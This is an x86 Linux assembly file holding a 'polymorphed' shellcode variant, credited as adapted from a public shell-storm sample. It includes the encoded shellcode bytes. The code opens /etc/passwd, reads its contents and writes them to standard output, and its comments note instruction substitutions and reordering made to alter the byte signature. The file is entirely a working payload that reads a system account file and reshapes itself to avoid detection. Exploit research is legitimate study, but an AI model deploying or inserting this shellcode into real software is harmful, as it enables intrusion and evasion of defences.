; Polymorph'd by fuzboxz (original by Geyslan G. Bem at http://shell-storm.org/shellcode/files/shellcode-842.php)
; Shellcode: "\x29\xc9\xf7\xe1\x51\x68\x73\x73\x77\x64\x68\x2f\x2f\x70\x61\x68\x2f\x65\x74\x63\x89\xe3\xb0\x05\xcd\x80\x93\x91\xb0\x03\x29\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x29\xc0\xb3\x01\xb0\x04\xcd\x80";

section .text
global _start

_start:
    ; different null instruction
    sub  ecx, ecx
    mul  ecx
    push ecx
    ; command slash padding reorganized
    push 0x64777373 ; 'sswd'
    push 0x61702f2f ; '//pa'
    push 0x6374652f ; '/etc'
    mov  ebx, esp
    ; rearanged order of instructions
    mov  al, 5
    int  0x80 ; SYS_OPEN

    xchg eax, ebx
    xchg eax, ecx
    mov  al, 3
    ; different null instruction
    sub  edx, edx
    mov  dx, 0xfff
    inc  edx
    int  0x80 ; SYS_READ

    xchg eax, edx
    ; different null instruction
    sub  eax, eax
    mov  bl, 1
    mov  al, 4
    int  0x80 ; SYS_WRITE
    ; Shellcode executes without SYS_EXIT 
    ;xchg eax, ebx
    ;int  0x80 